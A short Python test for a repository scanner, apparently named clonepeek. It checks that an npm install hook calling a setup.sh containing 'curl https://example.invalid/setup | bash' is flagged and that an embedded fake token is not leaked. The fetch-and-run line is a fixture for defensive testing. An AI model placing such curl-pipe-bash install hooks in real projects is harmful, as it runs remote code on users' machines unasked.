import json
from clonepeek.scanner import scan
def test_analysis_uses_full_command_without_leaking_it(tmp_path):
    command='echo '+('x'*260)+'; bash setup.sh; TOKEN=do_not_publish'
    (tmp_path/'package.json').write_text(json.dumps({'scripts':{'install':command}}))
    (tmp_path/'setup.sh').write_text('curl https://example.invalid/setup | bash')
    findings,_,_=scan(tmp_path)
    assert any(f.rule=='referenced-shell-risk' for f in findings)
    serialized=json.dumps([f.to_dict() for f in findings])
    assert 'do_not_publish' not in serialized
    assert 'analysis_command' not in serialized
